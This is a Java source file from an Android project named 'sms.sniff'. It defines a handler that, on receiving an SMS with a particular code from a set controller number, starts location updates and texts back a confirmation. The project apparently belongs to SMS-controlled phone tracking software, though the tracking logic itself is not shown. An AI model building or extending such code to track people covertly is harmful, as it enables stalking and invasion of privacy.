package sms.sniff.behaviors.location;

import sms.sniff.behaviors.Behavior;
import sms.sniff.core.Constants;
import sms.sniff.location.LocationUpdater;
import sms.sniff.utils.SMS;
import android.content.Context;
import android.telephony.SmsMessage;

public class StartLocation implements Behavior {
	
	private Context context;

	public StartLocation(Context context) {
		this.context = context;
	}

	@Override
	public void process(SmsMessage sms) {

		new LocationUpdater(context);
		
		new SMS(".").sendConfirmation();

	}

	@Override
	public boolean canProcess(SmsMessage sms) {
		String messageBody = sms.getMessageBody();
		String originPhoneNumber = sms.getDisplayOriginatingAddress();
		
		return messageBody.contains(Constants.messageCode_start_location) && Constants.destination.equals(originPhoneNumber);
	}

}
